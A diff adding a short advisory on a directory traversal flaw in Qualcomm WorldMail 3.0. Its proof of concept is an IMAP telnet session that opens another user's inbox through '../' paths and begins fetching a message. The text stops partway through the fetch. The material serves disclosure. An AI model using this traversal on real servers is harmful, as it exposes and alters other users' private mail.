@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/15488/info
+
+Qualcomm Worldmail server is prone to a directory traversal vulnerability.
+
+Successful exploitation could allow an attacker to gain access to files owned by other users of the application.
+
+Sensitive information may be obtained and modified in this manner.
+
+Worldmail server version 3.0 is vulnerable; other versions may also be affected. 
+
+c:\> telnet 1.2.3.4 143
+
+* OK WorldMail IMAP4 Server 6.1.19.0 ready
+1 login user1 user1
+1 OK LOGIN completed
+
+2 select /inbox
+* 0 EXISTS
+* OK [UNSEEN 0]
+2 OK [READ-WRITE] opened /inbox
+
+2 select ./../../administrator/inbox
+* 1 EXISTS
+* OK [UNSEEN 1] Message 1 is first unseen
+2 OK [READ-WRITE] opened ./../../administrator/inbox
+
+2 fetch 1 (RFC822.TEXT)
+* 1 FETCH (RFC822.TEXT {131} 
